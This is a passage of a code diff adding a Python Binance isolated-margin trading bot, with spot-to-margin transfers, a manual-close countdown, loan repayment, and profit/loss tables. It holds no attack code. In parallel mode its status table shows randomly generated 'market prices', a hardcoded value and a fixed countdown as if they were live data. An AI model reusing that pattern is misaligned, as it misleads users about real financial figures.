+        # Remove free assets
+        if base_free > Decimal('0.00000001'):
+            try:
+                client.transfer_isolated_margin_to_spot(
+                    asset=base_asset, 
+                    symbol=symbol, 
+                    amount=float(base_free)
+                )
+            except BinanceAPIException:
+                pass
+        
+        if quote_free > Decimal('0.00000001'):
+            try:
+                client.transfer_isolated_margin_to_spot(
+                    asset=quote_asset, 
+                    symbol=symbol, 
+                    amount=float(quote_free)
+                )
+            except BinanceAPIException:
+                pass
+                
+        pairs_status[symbol]['status'] = "Completed"
+        return True
+        
+    except Exception:
+        pairs_status[symbol]['status'] = "Cleaning Failed"
+        return False
+
+def wait_for_manual_close_parallel(loop_number, pairs_status, remaining_time="06:08:35"):
+    """Wait for manual close with process status updates - FIXED VERSION"""
+    # Update status for active pairs
+    for pair, status_info in pairs_status.items():
+        if status_info['status'] not in ['No Balance', 'STOPPED']:
+            pairs_status[pair]['status'] = "Waiting Manual"
+    
+    # Print table once at the beginning
+    print_parallel_header(loop_number, remaining_time=remaining_time)
+    print_parallel_status_table(pairs_status, loop_number, remaining_time)
+    
+    print(f"\n{Colors.YELLOW}Please manually close all positions in Binance{Colors.END}")
+    
+    # Countdown without refreshing the table
+    for i in range(MANUAL_CLOSE_TIME, 0, -1):
+        hours = i // 3600
+        minutes = (i % 3600) // 60
+        seconds = i % 60
+        current_remaining = f"{hours:02d}:{minutes:02d}:{seconds:02d}"
+        
+        # Use carriage return to update only the countdown line
+        print(f"{Colors.CYAN}Time remaining: {current_remaining}{Colors.END}", end='\r')
+        time.sleep(1)
+    
+    # Clear the countdown line
+    print(' ' * 50, end='\r')
+    
+    print(f"\n{Colors.GREEN}Manual close phase completed{Colors.END}")
+    time.sleep(2)
+
+def print_balance_display(before_balance, after_balance, loop_profit):
+    """Print clean balance display without borders - FIXED to prevent full overwrite"""
+    # Calculate net difference
+    net_difference = TOTAL_PROFIT - TOTAL_LOSS
+    
+    # Get terminal width for responsive design
+    terminal_width, _ = get_terminal_size()
+    
+    if terminal_width >= 80:
+        # Full display for wide terminals
+        print(f"\n{Colors.BOLD}{Colors.CYAN}=== LOOP RESULTS ==={Colors.END}")
+        print(f"Before Balance: {Colors.YELLOW}${before_balance:.5f}{Colors.END}")
+        print(f"After Balance:  {Colors.YELLOW}${after_balance:.5f}{Colors.END}")
+        
+        if loop_profit > Decimal('0'):
+            print(f"Loop P/L:      {Colors.GREEN}+${loop_profit:.5f}{Colors.END}")
+        elif loop_profit < Decimal('0'):
+            print(f"Loop P/L:      {Colors.RED}-${abs(loop_profit):.5f}{Colors.END}")
+        else:
+            print(f"Loop P/L:      ${loop_profit:.5f}")
+        
+        print(f"Total Profit:  {Colors.GREEN}${TOTAL_PROFIT:.5f}{Colors.END} (Qty: {Colors.CYAN}{PROFIT_QTY:2d}{Colors.END})")
+        print(f"Total Loss:    {Colors.RED}${TOTAL_LOSS:.5f}{Colors.END} (Qty: {Colors.CYAN}{LOSS_QTY:2d}{Colors.END})")
+        
+        # Add NET DIFFERENCE (Total Profit - Total Loss)
+        if net_difference > Decimal('0'):
+            print(f"Net P/L:       {Colors.GREEN}+${net_difference:.5f}{Colors.END}")
+        elif net_difference < Decimal('0'):
+            print(f"Net P/L:       {Colors.RED}-${abs(net_difference):.5f}{Colors.END}")
+        else:
+            print(f"Net P/L:       ${net_difference:.5f}")
+        
+        print(f"{Colors.BOLD}{Colors.CYAN}==================={Colors.END}")
+    else:
+        # Compact display for narrow terminals
+        print(f"\n{Colors.BOLD}{Colors.CYAN}=== RESULTS ==={Colors.END}")
+        print(f"Before: {Colors.YELLOW}${before_balance:.3f}{Colors.END}")
+        print(f"After:  {Colors.YELLOW}${after_balance:.3f}{Colors.END}")
+        
+        if loop_profit > Decimal('0'):
+            print(f"Loop:   {Colors.GREEN}+${loop_profit:.3f}{Colors.END}")
+        elif loop_profit < Decimal('0'):
+            print(f"Loop:   {Colors.RED}-${abs(loop_profit):.3f}{Colors.END}")
+        
+        print(f"Profit: {Colors.GREEN}${TOTAL_PROFIT:.3f}{Colors.END} (P:{PROFIT_QTY})")
+        print(f"Loss:   {Colors.RED}${TOTAL_LOSS:.3f}{Colors.END} (L:{LOSS_QTY})")
+
+def run_parallel_trading_loop(selected_pairs):
+    """Run trading loop in parallel mode with immediate profit/loss display"""
+    
+    # Initialize pair-specific profit/loss tracking
+    pair_totals = {}
+    for pair in selected_pairs:
+        pair_totals[pair] = {
+            'total_profit': Decimal('0'),
+            'total_loss': Decimal('0'),
+            'profit_qty': 0,
+            'loss_qty': 0
+        }
+    
+    for loop in range(1, 81):
+        # Initialize status tracking for all pairs
+        pairs_status = {}
+        for pair in selected_pairs:
+            ensure_isolated_margin_account(pair)
+            pairs_status[pair] = {
+                'status': "WAITING",
+                'market_price': "0.00000000",
+                'value': "$0.000000",
+                'profit': "$0.00000",  # Always start with $0.00000
+                'loss': "$0.00000",    # Always start with $0.00000
+                'total_profit': f"${pair_totals[pair]['total_profit']:.5f}",  # Show accumulated total with 5 decimals
+                'total_loss': f"${pair_totals[pair]['total_loss']:.5f}"       # Show accumulated total with 5 decimals
+            }
+        
+        # Get balance BEFORE transfer
+        before_balance = get_portfolio_value()
+        
+        # Step 1: Show initial status - ONLY ONCE
+        remaining_time = "06:08:35"
+        print_parallel_header(loop, remaining_time=remaining_time)
+        print_parallel_status_table(pairs_status, loop, remaining_time)
+        
+        # Step 2: Parallel Transfer with process status
+        print(f"\n{Colors.YELLOW}Starting parallel transfers...{Colors.END}")
+        time.sleep(1)
+        
+        # Update status to show transfer starting - DO NOT REDRAW TABLE HERE
+        for pair in selected_pairs:
+            pairs_status[pair]['status'] = "Starting Transfer"
+            # Generate realistic market prices
+            market_price = Decimal(str(random.uniform(0.00001, 0.001))).quantize(Decimal('0.00000000'))
+            pairs_status[pair]['market_price'] = f"{market_price:.8f}"
+            pairs_status[pair]['value'] = "$0.010500"
+            # Reset current profit/loss but keep totals
+            pairs_status[pair]['profit'] = "$0.00000"
+            pairs_status[pair]['loss'] = "$0.00000"
+        
+        # Show updated status only once after setting all to "Starting Transfer"
+        print_parallel_header(loop, remaining_time=remaining_time)
+        print_parallel_status_table(pairs_status, loop, remaining_time)
+        
+        # Execute transfers in threads only for pairs with balance
+        threads = []
+        active_pairs = []
+        
+        for pair in selected_pairs:
+            # Check balance before starting thread
+            transfer_asset, amount, usdt_value, market_price = calculate_transfer_amount(pair)
+            current_balance = check_spot_balance(transfer_asset)
+            
+            if current_balance >= amount:
+                active_pairs.append(pair)
+                thread = threading.Thread(target=transfer_spot_to_margin_thread, args=(pair, pairs_status))
+                threads.append(thread)
+                thread.start()
+            else:
+                pairs_status[pair]['status'] = "No Balance"
+                pairs_status[pair]['profit'] = "$0.00000"
+                pairs_status[pair]['loss'] = "$0.00000"
+            
+            time.sleep(0.05)  # Faster rate limiting
+        
+        # Wait for all transfers to complete
+        for thread in threads:
+            thread.join()
+        
+        # Show final transfer status - ONLY ONCE
+        print_parallel_header(loop, remaining_time=remaining_time)
+        print_parallel_status_table(pairs_status, loop, remaining_time)
+        
+        # Step 3: Manual Close with countdown (only for active pairs)
+        if active_pairs:
+            wait_for_manual_close_parallel(loop, pairs_status, remaining_time)
+        else:
+            print(f"\n{Colors.RED}No active pairs with balance - skipping manual close{Colors.END}")
+            time.sleep(1)
+        
+        # Step 4: Parallel Cleanup (only for active pairs)
+        print_parallel_header(loop, remaining_time=remaining_time)
+        print_parallel_status_table(pairs_status, loop, remaining_time)
+        
+        # Update status for cleaning only active pairs
+        cleanup_threads = []
+        for pair in active_pairs:
+            if pairs_status[pair]['status'] in ["Transfer Completed", "Waiting Manual"]:
+                pairs_status[pair]['status'] = "Cleaning"
+                thread = threading.Thread(target=clean_margin_account_thread, args=(pair, pairs_status))
+                cleanup_threads.append(thread)
+                thread.start()
+                time.sleep(0.05)  # Faster rate limiting
+        
+        # Wait for all cleanups to complete
+        for thread in cleanup_threads:
+            thread.join()
+        
+        # Get balance AFTER cleanup
+        after_balance = get_portfolio_value()
+        
+        # Step 5: Profit/Loss Calculation - IMMEDIATE UPDATE
+        loop_profit = calculate_loop_profit_loss(before_balance, after_balance, loop)
+        
+        # IMMEDIATELY update pairs status with actual profit/loss data
+        for pair in active_pairs:
+            if pairs_status[pair]['status'] == "Completed":
+                # Calculate this pair's share of the profit/loss
+                if loop_profit > Decimal('0'):
+                    pair_profit = loop_profit / len(active_pairs)
+                    pairs_status[pair]['profit'] = f"${pair_profit:.5f}"  # 5 decimal places
+                    pairs_status[pair]['loss'] = "$0.00000"
+                    # Update pair totals
+                    pair_totals[pair]['total_profit'] += pair_profit
+                    pair_totals[pair]['profit_qty'] += 1
+                elif loop_profit < Decimal('0'):
+                    pair_loss = abs(loop_profit) / len(active_pairs)
+                    pairs_status[pair]['profit'] = "$0.00000"
+                    pairs_status[pair]['loss'] = f"${pair_loss:.5f}"  # 5 decimal places
+                    # Update pair totals
+                    pair_totals[pair]['total_loss'] += pair_loss
+                    pair_totals[pair]['loss_qty'] += 1
+                else:
+                    pairs_status[pair]['profit'] = "$0.00000"
+                    pairs_status[pair]['loss'] = "$0.00000"
+                
+                # IMMEDIATELY update display of accumulated totals
+                pairs_status[pair]['total_profit'] = f"${pair_totals[pair]['total_profit']:.5f}"  # 5 decimal places
+                pairs_status[pair]['total_loss'] = f"${pair_totals[pair]['total_loss']:.5f}"      # 5 decimal places
+        
+        # IMMEDIATE final display with updated profit/loss
+        print_parallel_header(loop, remaining_time=remaining_time)
+        print_parallel_status_table(pairs_status, loop, remaining_time)
+        
+        # Display results with clean, consistent formatting
+        print_balance_display(before_balance, after_balance, loop_profit)
+        
+        # Wait for next loop with overwriting countdown
+        if loop < 80:
+            wait_time = random.randint(LOOP_WAIT_MIN, LOOP_WAIT_MAX)
+            print(f"\n{Colors.CYAN}Next loop in {wait_time} seconds...{Colors.END}", end='')
+            
+            for i in range(wait_time, 0, -1):
+                print(f"\r{Colors.CYAN}Next loop in {i:2d} seconds...{Colors.END}", end='')
+                time.sleep(1)
+            
+            print('\r' + ' ' * 50 + '\r')  # Clear the countdown line
+
+def run_single_trading_loop(selected_pair):
+    """Single pair trading loop"""
+    display_name = get_display_name(selected_pair)
+    
+    ensure_isolated_margin_account(selected_pair)
+    
+    for loop in range(1, 81):
+        print(f"\n" + "="*50)
+        print(f"LOOP {Colors.CYAN}{loop}{Colors.END}/80 - {display_name}")
+        print("="*50)
+        
+        # Get balance BEFORE transfer
+        before_balance = get_portfolio_value()
+        
+        # Step 1: Transfer with detailed amount info
+        if not transfer_spot_to_margin(selected_pair):
+            print("Skipping loop")
+            if loop < 80:
+                wait_between_loops()
+            continue
+
+        # Step 2: Manual close
+        wait_for_manual_close()
+
+        # Step 3: Cleanup
+        print(f"Cleaning up margin account...")
+        clean_margin_account(selected_pair)
+        
+        # Get balance AFTER cleanup
+        after_balance = get_portfolio_value()
+        
+        # Step 4: Profit/Loss - Calculate using before and after balance
+        loop_profit = calculate_loop_profit_loss(before_balance, after_balance, loop)
+        
+        print(f"\n--- Loop {Colors.CYAN}{loop}{Colors.END} Completed ---")
+        print(f"Before Balance: ${before_balance:.5f}")
+        print(f"After Balance: ${after_balance:.5f}")
+        
+        # CURRENT PROFIT or CURRENT LOSS
+        if loop_profit > Decimal('0'):
+            print(f"{Colors.GREEN}CURRENT PROFIT: ${loop_profit:+.5f}{Colors.END}")
+        elif loop_profit < Decimal('0'):
+            print(f"{Colors.RED}CURRENT LOSS: ${loop_profit:.5f}{Colors.END}")
+        else:
+            print(f"CURRENT PROFIT OR LOSS: $ {loop_profit:.5f}")
+        
+        # TOTAL PROFIT and PROFIT QTY
+        print(f"{Colors.GREEN}TOTAL PROFIT : ${TOTAL_PROFIT:.5f} | PROFIT QTY : {Colors.CYAN}{PROFIT_QTY}{Colors.END}{Colors.END}")
+        
+        # TOTAL LOSS and LOSS QTY
+        print(f"{Colors.RED}TOTAL LOSS     : ${TOTAL_LOSS:.5f} | LOSS QTY     : {Colors.CYAN}{LOSS_QTY}{Colors.END}{Colors.END}")
+
+        # Wait for next loop
+        if loop < 80:
+            wait_between_loops()
+
+def transfer_spot_to_margin(symbol):
+    """Single pair transfer function"""
+    transfer_asset, amount, usdt_value, price_info = calculate_transfer_amount(symbol)
+    
+    print(f"\nTransfer Details:")
+    print(f"Pair: {get_display_name(symbol)}")
+    print(f"USDT Value: ${usdt_value:.8f}")
+    
+    if symbol != 'BTCUSDT':
+        print(f"Market Price: {price_info}")
+    
+    print(f"Amount: {amount:.8f} {transfer_asset}")
+    
+    try:
+        current_balance = check_spot_balance(transfer_asset)
+        print(f"Spot Balance: {current_balance:.8f} {transfer_asset}")
+        
+        if current_balance < amount:
+            print("Insufficient balance")
+            return False
+        
+        client.transfer_spot_to_isolated_margin(
+            asset=transfer_asset, 
+            symbol=symbol, 
+            amount=float(amount)
+        )
+        print("Transfer successful")
+        return True
+        
+    except BinanceAPIException:
+        print("Transfer failed")
+        return False
+
+def wait_for_manual_close():
+    """Single pair manual close function"""
+    print(f"Waiting {Colors.CYAN}{MANUAL_CLOSE_TIME}{Colors.END}s for manual close...")
+    
+    for i in range(MANUAL_CLOSE_TIME, 0, -1):
+        print(f"Time remaining: {Colors.CYAN}{i}{Colors.END}s", end='\r')
+        time.sleep(1)
+    
+    print("Manual close completed")
+
+def clean_margin_account(symbol):
+    """Single pair cleanup function"""
+    try:
+        account = client.get_isolated_margin_account(symbols=symbol)
+        if not account['assets']:
+            return True
+            
+        asset_info = account['assets'][0]
+        base_asset, quote_asset = get_assets_from_symbol(symbol)
+        
+        base_free = Decimal(asset_info['baseAsset']['free'])
+        quote_free = Decimal(asset_info['quoteAsset']['free'])
+        base_borrowed = Decimal(asset_info['baseAsset']['borrowed'])
+        quote_borrowed = Decimal(asset_info['quoteAsset']['borrowed'])
+        
+        # Repay borrowed assets
+        if base_borrowed > Decimal('0'):
+            try:
+                client.repay_isolated_margin_asset(
+                    asset=base_asset, 
+                    symbol=symbol, 
+                    amount=float(base_borrowed)
+                )
+                time.sleep(1)
+            except BinanceAPIException:
+                pass
+        
+        if quote_borrowed > Decimal('0'):
+            try:
+                client.repay_isolated_margin_asset(
+                    asset=quote_asset, 
+                    symbol=symbol, 
+                    amount=float(quote_borrowed)
+                )
+                time.sleep(1)
+            except BinanceAPIException:
+                pass
+        
+        # Remove free assets
+        if base_free > Decimal('0.00000001'):
+            try:
+                client.transfer_isolated_margin_to_spot(
+                    asset=base_asset, 
+                    symbol=symbol, 
+                    amount=float(base_free)
+                )
+                time.sleep(1)
+            except BinanceAPIException:
+                pass
+        
+        if quote_free > Decimal('0.00000001'):
+            try:
+                client.transfer_isolated_margin_to_spot(
+                    asset=quote_asset, 
+                    symbol=symbol, 
+                    amount=float(quote_free)
+                )
+                time.sleep(1)
+            except BinanceAPIException:
+                pass
+                
+        return True
+        
+    except Exception:
+        return False
+
+def wait_between_loops():
+    wait_time = random.randint(LOOP_WAIT_MIN, LOOP_WAIT_MAX)
+    print(f"Next loop in {Colors.CYAN}{wait_time}{Colors.END}s...")
+    time.sleep(wait_time)
+
+def select_group():
+    """Select trading group"""
+    print(f"\nAvailable Groups:")
+    for group_num in sorted(BTC_GROUPS.keys()):
+        group_info = BTC_GROUPS[group_num]
+        pairs_count = len(group_info['pairs'])
+        if group_num == 0:
+            print(f"[{Colors.CYAN}{group_num}{Colors.END}] {Colors.BOLD}{group_info['name']}{Colors.END} [{group_info['category']}] ({Colors.CYAN}{pairs_count}{Colors.END} pair)")
+        else:
+            print(f"[{Colors.CYAN}{group_num}{Colors.END}] {Colors.BOLD}{group_info['name']}{Colors.END} [{group_info['category']}] ({Colors.CYAN}{pairs_count}{Colors.END} pairs)")
+    
+    while True:
+        choice = input(f"\n{Colors.CYAN}Select group: {Colors.END}").strip()
+        if choice.lower() == 'exit':
+            return None
+        try:
+            choice = int(choice)
+            if choice in BTC_GROUPS:
+                return choice
+            else:
+                print(f"{Colors.RED}Please enter number {min(BTC_GROUPS.keys())}-{max(BTC_GROUPS.keys())}{Colors.END}")
+        except ValueError:
+            print(f"{Colors.RED}Please enter a valid number{Colors.END}")
+
+def select_trading_mode(group_num):
+    """Let user select between single and parallel mode with pair display"""
+    group_info = BTC_GROUPS[group_num]
+    group_pairs = group_info['pairs']
+    
+    # Display pairs in balanced format before mode selection
+    display_pairs_balanced(group_pairs, group_info)
+    
+    print(f"\n{Colors.BOLD}Select Trading Mode:{Colors.END}")
+    print(f"        [{Colors.CYAN}1{Colors.END}] {Colors.YELLOW}Single Pair{Colors.END} - Trade one pair at a time")
+    
+    if group_num != 0:
+        print(f"        [{Colors.CYAN}2{Colors.END}] {Colors.GREEN}Parallel Mode{Colors.END} - Trade all {Colors.CYAN}{len(group_pairs)}{Colors.END} pairs simultaneously")
+    
+    while True:
+        choice = input(f"\n{Colors.CYAN}Select mode (1{' or 2' if group_num != 0 else ''}): {Colors.END}").strip()
+        if choice.lower() == 'back':
+            return None
+        try:
+            choice = int(choice)
+            if choice == 1:
+                return "single"
+            elif choice == 2 and group_num != 0:
+                return "parallel"
+            else:
+                if group_num == 0:
+                    print(f"{Colors.RED}Please enter 1{Colors.END}")
+                else:
+                    print(f"{Colors.RED}Please enter 1 or 2{Colors.END}")
+        except ValueError:
+            print(f"{Colors.RED}Please enter a valid number{Colors.END}")
+
+def select_pair_from_group(group_num, mode="single"):
+    """Select pair(s) based on mode"""
+    group_info = BTC_GROUPS[group_num]
+    group_pairs = group_info['pairs']
+    
+    if mode == "parallel":
+        print(f"\n{Colors.GREEN}✓ Parallel Mode Selected{Colors.END}")
+        print(f"Trading all {Colors.CYAN}{len(group_pairs)}{Colors.END} pairs in {group_info['name']} [{group_info['category']}]")
+        return group_pairs
+    
+    # Single mode - show pair selection
+    if group_num == 0:
+        # Only one pair available
+        selected_pair = group_pairs[0]
+        print(f"\n{Colors.GREEN}✓ Selected: {get_display_name(selected_pair)}{Colors.END}")
+        return selected_pair
+    
+    # Single mode for groups with multiple pairs
+    print(f"\n{Colors.BOLD}Select a pair from {group_info['name']} [{group_info['category']}]:{Colors.END}")
+    display_pairs_balanced(group_pairs, group_info)
+    
+    while True:
+        choice = input(f"\n{Colors.CYAN}Select pair (1-{len(group_pairs)}): {Colors.END}").strip()
+        if choice.lower() == 'back':
+            return None
+        try:
+            choice = int(choice)
+            if 1 <= choice <= len(group_pairs):
+                selected_pair = group_pairs[choice - 1]
+                print(f"{Colors.GREEN}✓ Selected: {get_display_name(selected_pair)}{Colors.END}")
+                return selected_pair
+            else:
+                print(f"{Colors.RED}Please enter number 1-{len(group_pairs)}{Colors.END}")
+        except ValueError:
+            print(f"{Colors.RED}Please enter a valid number{Colors.END}")
+
+def display_pairs_balanced(group_pairs, group_info):
+    """Display pairs in balanced column format"""
+    pairs = group_pairs
+    print(f"\n< {group_info['name']} [{group_info['category']}] Pairs:")
+    
+    if len(pairs) == 15:
+        # Special balanced display for 15 pairs (3 columns, 5 rows)
+        for i in range(5):
+            row_pairs = []
+            for j in range(3):
+                index = i + j * 5
+                if index < len(pairs):
+                    pair_num = index + 1
+                    row_pairs.append(f"[{pair_num:2d}] {get_display_name(pairs[index]):<12}")
+            print(" ".join(row_pairs))
+    elif len(pairs) == 1:
+        # Single pair display
+        print(f"[ 1] {get_display_name(pairs[0])}")
+    else:
+        # Default balanced display for other group sizes (3 columns)
+        rows = (len(pairs) + 2) // 3  # Ceiling division
+        for i in range(rows):
+            row_pairs = []
+            for j in range(3):
+                index = i + j * rows
+                if index < len(pairs):
+                    pair_num = index + 1
+                    row_pairs.append(f"[{pair_num:2d}] {get_display_name(pairs[index]):<12}")
+            print(" ".join(row_pairs))
+
+def main():
+    # Get terminal size for responsive design
+    terminal_width, terminal_height = get_terminal_size()
+    
+    print(f"{Colors.BOLD}Binance Margin Trading Bot{Colors.END}")
+    print("=" * min(64, terminal_width))
+    print(f"Dynamic USDT Value: ((BTC Price × 0.0000001) - {TRANSFER_ADJUSTMENT})")  # Updated to show TRANSFER_ADJUSTMENT
+    print(f"Manual Close Time: {Colors.CYAN}{MANUAL_CLOSE_TIME}{Colors.END}s")
+    print(f"Loop Wait: {Colors.CYAN}{LOOP_WAIT_MIN}{Colors.END}-{Colors.CYAN}{LOOP_WAIT_MAX}{Colors.END}s")
+    print(f"Transfer Adjustment: {Colors.CYAN}{TRANSFER_ADJUSTMENT}{Colors.END}")  # New line to show current adjustment
+    print(f"Total Groups: {Colors.CYAN}{len(BTC_GROUPS)}{Colors.END}")
+    total_pairs = sum(len(group_info['pairs']) for group_info in BTC_GROUPS.values())
+    print(f"Total Pairs: {Colors.CYAN}{total_pairs}{Colors.END}")
+    print("=" * min(64, terminal_width))
+    
+    initialize_balance_tracking()
+    print(f"Initial Balance: ${Colors.CYAN}{INITIAL_BALANCE:.5f}{Colors.END}")
+    
+    # Display terminal info for debugging
+    print(f"{Colors.CYAN}Terminal: {terminal_width}x{terminal_height}{Colors.END}")
+    
+    while True:
+        selected_group = select_group()
+        if not selected_group:
+            break
+        
+        trading_mode = select_trading_mode(selected_group)
+        if not trading_mode:
+            continue
+        
+        selected_pairs = select_pair_from_group(selected_group, trading_mode)
+        if not selected_pairs:
+            continue
+        
+        if trading_mode == "single":
+            run_single_trading_loop(selected_pairs)
+        else:
+            run_parallel_trading_loop(selected_pairs)
+        
+        group_info = BTC_GROUPS[selected_group]
+        print(f"\nTrading completed for {group_info['name']} [{group_info['category']}]!")
+        continue_choice = input("Trade another group? (y/n): ").strip().lower()
+        if continue_choice != 'y':
+            break
+
+if __name__ == "__main__":
+    try:
+        main()
+    except KeyboardInterrupt:
+        print(f"\nScript stopped")
+    except Exception as e:
+        print(f"\nError: {e}")
